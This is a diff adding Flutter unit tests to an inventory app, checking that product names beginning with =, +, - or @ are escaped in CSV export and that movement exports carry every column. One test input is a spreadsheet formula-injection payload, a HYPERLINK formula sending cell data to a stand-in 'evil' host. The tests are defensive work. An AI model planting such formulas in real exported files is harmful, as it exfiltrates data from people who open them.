@@ -5,6 +5,7 @@ import 'package:drift/drift.dart' hide isNull, isNotNull;
 import 'package:drift/native.dart';
 import 'package:flutter_test/flutter_test.dart';
 import 'package:stocksafe/src/data/database.dart';
+import 'package:stocksafe/src/data/backup_service.dart';
 import 'package:stocksafe/src/services/csv_import_service.dart';
 
 void main() {
@@ -253,6 +254,49 @@ void main() {
       final hits = await db.productDao.watchAll(query: '%').first;
       expect(hits, isEmpty,
           reason: 'a bare % is a literal character, not "match all"');
+    });
+  });
+
+  group('CSV export is safe to open', () {
+    test('a formula in a product name is neutralised', () async {
+      // Opened in Excel or Sheets, a cell starting with = is executed. Product
+      // names come from the user and from supplier CSVs.
+      await newProduct('=HYPERLINK("http://evil/"&A1,"click me")');
+      await newProduct('+1+1');
+      await newProduct('-2-2');
+      await newProduct('@SUM(A1:A9)');
+      await newProduct('Ordinary Rice 5kg');
+
+      final csv = await BackupService(db).exportProductsCsv();
+
+      for (final dangerous in ['=HYPERLINK', '+1+1', '-2-2', '@SUM']) {
+        expect(csv, contains("'$dangerous"),
+            reason: '$dangerous must be prefixed so it is read as text');
+      }
+      // An ordinary name is left exactly as the user typed it.
+      expect(csv, contains('Ordinary Rice 5kg'));
+      expect(csv, isNot(contains("'Ordinary")));
+    });
+
+    test('movement export includes every column', () async {
+      // "Export stops at Buy Rate" is a competitor complaint this app answers,
+      // so a missing column is a product bug, not a cosmetic one.
+      final id = await newProduct('Tracked item');
+      await db.movementDao.recordMovement(
+        productId: id,
+        qtyDelta: 4,
+        reason: 'purchase',
+      );
+
+      final csv = await BackupService(db).exportMovementsCsv();
+      final header = csv.split('\n').first;
+
+      for (final column in [
+        'ID', 'Product ID', 'Qty Delta', 'Reason', 'Note',
+        'Batch ID', 'Supplier ID', 'Audit Session ID', 'Created At',
+      ]) {
+        expect(header, contains(column));
+      }
     });
   });
 }
